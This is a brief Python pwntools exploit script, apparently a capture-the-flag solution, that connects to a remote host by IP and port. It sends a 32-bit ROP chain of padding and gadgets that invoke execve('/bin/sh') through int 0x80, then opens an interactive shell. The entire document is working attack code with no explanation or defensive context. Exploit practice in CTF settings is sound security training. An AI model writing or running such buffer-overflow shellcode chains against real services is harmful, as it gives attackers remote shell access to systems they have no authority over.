from pwn import *

r=remote('47.104.190.38',12001)

pop_edx_ecx_ebx=0x08072fb1

pop_eax=0x080c11e6

sh=0x080c4989

int_0x80=0x08049903

payload=flat(
        ['a'*112,pop_eax,0xb,pop_edx_ecx_ebx,0,0,sh,int_0x80])
r.sendline(payload)

r.interactive()
